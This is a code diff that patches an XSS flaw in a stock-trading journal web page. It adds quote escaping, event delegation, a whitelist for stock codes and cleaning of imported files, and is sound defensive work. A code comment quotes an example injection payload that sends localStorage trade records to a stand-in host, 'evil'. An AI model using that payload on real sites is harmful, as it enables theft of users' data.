@@ -368,7 +368,8 @@ function resolveCode(input) {
   // 也接受行情資料裡的名稱（監控清單以外的個股）
   for (const [c, p] of Object.entries(twPrices)) if (p?.name === raw) return c;
   for (const [c, p] of Object.entries(usPrices)) if (p?.name === raw) return c;
-  return up;
+  // 查不到對應名稱時才當成代號用，但只留代號會出現的字元
+  return cleanCode(up);
 }
 
 function nameOf(code) {
@@ -846,7 +847,7 @@ function posShell(p, uid, pl, pct, sub, rows, body) {
   const arrow = pct == null ? '' : pct > 0 ? '↑' : pct < 0 ? '↓' : '→';
   const isHeld = uid.endsWith(':held');
 
-  return `<div class="pos-card${edge}${open ? ' open' : ''}" onclick="toggleCode('${uid}')">
+  return `<div class="pos-card${edge}${open ? ' open' : ''}" data-act="toggle" data-uid="${esc(uid)}">
     <div class="pos-name">
       <b>${esc(p.name)}</b><span>${esc(p.code)}</span>
       ${isHeld ? '' : '<span style="color:var(--text3)">已出清</span>'}
@@ -920,7 +921,7 @@ function tripRow(r, market) {
   const why = [b && b.why ? `買：${esc(b.why)}` : '', s.why ? `賣：${esc(s.why)}` : '']
     .filter(Boolean).join('<br>');
 
-  return `<div class="pos-tx" onclick="event.stopPropagation()">
+  return `<div class="pos-tx" data-act="noop">
     <div class="pos-tx-hd">
       <span class="tag tag-buy">買進</span>
       <span class="tx-date">${b ? esc(b.date) : '無紀錄'}</span>
@@ -935,8 +936,8 @@ function tripRow(r, market) {
     ${r.orphan ? `<div class="pos-tx-why" style="color:var(--dn)">⚠️ 這 ${fmt(r.qty)} 股找不到對應的買進紀錄，成本以 0 計。可能是漏記買進或股數打錯。</div>`
                : `<div class="pos-tx-why ${why ? '' : 'empty'}">${why || '（未填寫理由）'}</div>`}
     <div class="pos-acts">
-      ${b ? `<button class="lnk" onclick="editTx(${b.id})">編輯買進</button>` : ''}
-      <button class="lnk" onclick="editTx(${s.id})">編輯賣出</button>
+      ${b ? `<button class="lnk" onclick="editTx(${+b.id || 0})">編輯買進</button>` : ''}
+      <button class="lnk" onclick="editTx(${+s.id || 0})">編輯賣出</button>
     </div>
   </div>`;
 }
@@ -950,19 +951,19 @@ function tripRow(r, market) {
 function noteBlock(code, uid) {
   const val = notes[code] || '';
   if (editingNote === uid) {
-    return `<div class="note-box editing" onclick="event.stopPropagation()">
+    return `<div class="note-box editing" data-act="noop">
       <div class="note-hd">📝 檢討備註</div>
-      <textarea id="note-input-${uid}" class="note-input"
+      <textarea id="note-input-${esc(uid)}" class="note-input"
         placeholder="這筆為什麼賺 / 為什麼賠？&#10;例：進場點對但太早停利，少賺一段；下次遇到題材剛發酵不要急著跑">${esc(val)}</textarea>
       <div class="note-acts">
-        <button class="btn btn-primary btn-sm" onclick="saveNote('${code}','${uid}')">儲存</button>
-        <button class="btn btn-ghost btn-sm" onclick="cancelNote()">取消</button>
+        <button class="btn btn-primary btn-sm" data-act="save-note" data-code="${esc(code)}" data-uid="${esc(uid)}">儲存</button>
+        <button class="btn btn-ghost btn-sm" data-act="cancel-note">取消</button>
       </div>
     </div>`;
   }
-  return `<div class="note-box" onclick="event.stopPropagation()">
+  return `<div class="note-box" data-act="noop">
     <div class="note-hd">📝 檢討備註
-      <button class="lnk" style="margin-left:auto" onclick="startNote('${uid}')">${val ? '編輯' : '新增'}</button>
+      <button class="lnk" style="margin-left:auto" data-act="start-note" data-uid="${esc(uid)}">${val ? '編輯' : '新增'}</button>
     </div>
     <div class="note-text ${val ? '' : 'empty'}">${val ? esc(val) : '尚未填寫。點「新增」記下這檔成功或失敗的原因。'}</div>
   </div>`;
@@ -994,7 +995,7 @@ async function saveNote(code, uid) {
 function posTx(t, note) {
   const amt = t.qty * t.price;
   const net = t.side === 'buy' ? amt + t.fee : amt - t.fee;
-  return `<div class="pos-tx" onclick="event.stopPropagation()">
+  return `<div class="pos-tx" data-act="noop">
     <div class="pos-tx-hd">
       <span class="tag tag-${t.side}">${t.side === 'buy' ? '買進' : '賣出'}</span>
       <span class="tx-date">${esc(t.date)}</span>
@@ -1005,8 +1006,8 @@ function posTx(t, note) {
     ${note ? `<div class="pos-tx-why" style="color:var(--text3)">↳ ${note}</div>` : ''}
     <div class="pos-tx-why ${t.why ? '' : 'empty'}">${t.why ? esc(t.why) : '（未填寫理由）'}</div>
     <div class="pos-acts">
-      <button class="lnk" onclick="editTx(${t.id})">編輯</button>
-      <button class="lnk del" onclick="delTx(${t.id})">刪除</button>
+      <button class="lnk" onclick="editTx(${+t.id || 0})">編輯</button>
+      <button class="lnk del" onclick="delTx(${+t.id || 0})">刪除</button>
     </div>
   </div>`;
 }
@@ -1015,6 +1016,29 @@ function toggleCode(uid) {
   openCode = openCode === uid ? null : uid;
   renderHoldings();
 }
+
+/*
+ * 持股區的點擊一律走事件委派，不用 inline onclick。
+ *
+ * 【為什麼不能只靠跳脫】
+ * inline handler 的屬性值會先被 HTML 解碼、再交給 JS 解析，所以把 ' 換成
+ * &#39; 沒有用——瀏覽器會解回 '，一樣跳得出字串。實測驗證過。
+ * 改成 data-* ＋ 委派之後，屬性值只是資料，永遠不會被當程式碼，
+ * 整類問題就消失了（而不是靠每個插值點都記得跳脫）。
+ */
+document.addEventListener('click', ev => {
+  const el = ev.target.closest('[data-act]');
+  if (!el || !document.getElementById('holdings-bd')?.contains(el)) return;
+  const { act, uid, code } = el.dataset;
+  if (act === 'toggle')          { toggleCode(uid); return; }
+  // noop = 備註框與交易明細這種「點了不要把卡片收起來」的擋板。
+  // 原本是 inline 的 event.stopPropagation()，但那會在事件傳到這裡之前
+  // 就先攔掉，委派永遠收不到 → 備註按鈕會失效。
+  if (act === 'noop')            return;
+  if (act === 'start-note')      startNote(uid);
+  else if (act === 'cancel-note') cancelNote();
+  else if (act === 'save-note')  saveNote(code, uid);
+});
 
 function txCard(t) {
   const amt = t.qty * t.price;
@@ -1032,8 +1056,8 @@ function txCard(t) {
     </div>
     <div class="tx-why ${t.why ? '' : 'empty'}">${t.why ? esc(t.why) : '（未填寫理由）'}</div>
     <div class="tx-acts">
-      <button class="lnk" onclick="event.stopPropagation();editTx(${t.id})">編輯</button>
-      <button class="lnk del" onclick="event.stopPropagation();delTx(${t.id})">刪除</button>
+      <button class="lnk" onclick="event.stopPropagation();editTx(${+t.id || 0})">編輯</button>
+      <button class="lnk del" onclick="event.stopPropagation();delTx(${+t.id || 0})">刪除</button>
     </div>
   </div>`;
 }
@@ -1058,8 +1082,30 @@ function renderTx() {
 
 function setFilter(k) { filterMode = k; renderTx(); }
 
+/*
+ * HTML 跳脫。**引號一定要跳脫**，不能只處理 < > &。
+ *
+ * 這頁很多地方把值塞進屬性裡的 JS 字串，例如
+ *   onclick="toggleCode('${uid}')"
+ * 而 uid 是從股票代號來的，代號又是使用者自己打的／從匯入檔讀進來的。
+ * 只跳脫 < > 的話，代號裡放一個單引號就能跳出字串，後面接的東西會被當程式碼執行：
+ *   代號 = 2330');fetch('//evil',{method:'POST',body:localStorage.trades});//
+ * 那段程式跑在本站的 origin 上，讀得到 localStorage 裡全部的交易紀錄。
+ * 實際驗證過可以觸發（2026/09），所以 ' 和 " 都必須跳脫。
+ */
 function esc(s) {
-  return String(s ?? '').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+  return String(s ?? '')
+    .replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;')
+    .replace(/"/g,'&quot;').replace(/'/g,'&#39;');
+}
+
+/*
+ * 代號白名單。跳脫是主要防線（已存在的壞資料也擋得住），
+ * 這條是第二層：從源頭就不讓奇怪的字元進到資料裡。
+ * 真實代號只會是英數字，頂多帶 . 或 -（例如 BRK.B、世芯 3661、00992A）。
+ */
+function cleanCode(s) {
+  return String(s ?? '').replace(/[^A-Za-z0-9.\-]/g, '').slice(0, 12);
 }
 
 // ══════════════════════════════════════════════════════
@@ -1086,16 +1132,46 @@ function importData(input) {
       const incoming = Array.isArray(data) ? data : data.trades;
       if (!Array.isArray(incoming)) throw new Error('格式不正確');
       const incomingNotes = (!Array.isArray(data) && data.notes) || {};
+
+      /*
+       * 匯入檔是唯一「資料不是自己打的」的入口——別人傳一個備份檔給你匯入，
+       * 就等於讓他往你的 localStorage 寫東西。所以在這裡把每一筆正規化：
+       * 代號只留合法字元、數字欄位強制轉數字、side 只收 buy/sell。
+       * 顯示端已經全面跳脫＋改用事件委派，這裡是不讓髒資料一開始就進來。
+       */
+      incoming.forEach(t => {
+        if (!t || typeof t !== 'object') return;
+        t.code   = cleanCode(t.code);
+        t.side   = t.side === 'sell' ? 'sell' : 'buy';
+        t.market = t.market === 'US' ? 'US' : 'TW';
+        t.id     = +t.id || Date.now() + Math.floor(Math.random() * 1e6);
+        t.qty    = +t.qty   || 0;
+        t.price  = +t.price || 0;
+        t.fee    = +t.fee   || 0;
+        t.name   = String(t.name ?? '');
+        t.why    = String(t.why  ?? '');
+        t.date   = String(t.date ?? '');
+      });
+      const bad = incoming.filter(t => !t || !t.code || !t.qty || !t.price).length;
+      if (bad && !confirm(`有 ${bad} 筆資料不完整（缺代號／股數／價格），會被略過。要繼續嗎？`)) return;
       const mode = confirm(`匯入 ${incoming.length} 筆紀錄。\n\n[確定] 合併到現有紀錄\n[取消] 完全取代現有紀錄`);
+      const clean = incoming.filter(t => t && t.code && t.qty && t.price);
+      // 備註的鍵也是代號，同樣要過白名單
+      const cleanNotes = {};
+      Object.entries(incomingNotes).forEach(([k, v]) => {
+        const c = cleanCode(k);
+        if (c) cleanNotes[c] = String(v ?? '');
+      });
+
       if (mode) {
         const ids = new Set(trades.map(t => t.id));
-        incoming.forEach(t => { if (!ids.has(t.id)) trades.push(t); });
+        clean.forEach(t => { if (!ids.has(t.id)) trades.push(t); });
         // 備註以現有的為準，只補上目前沒有的，避免覆蓋掉後來寫的檢討
-        Object.entries(incomingNotes).forEach(([k,v]) => { if (!notes[k]) notes[k] = v; });
+        Object.entries(cleanNotes).forEach(([k,v]) => { if (!notes[k]) notes[k] = v; });
       } else {
         if (!confirm('這會刪除目前所有紀錄，確定嗎？')) return;
-        trades = incoming;
-        notes  = incomingNotes;
+        trades = clean;
+        notes  = cleanNotes;
       }
       await save(); renderAll();
       alert('匯入完成');
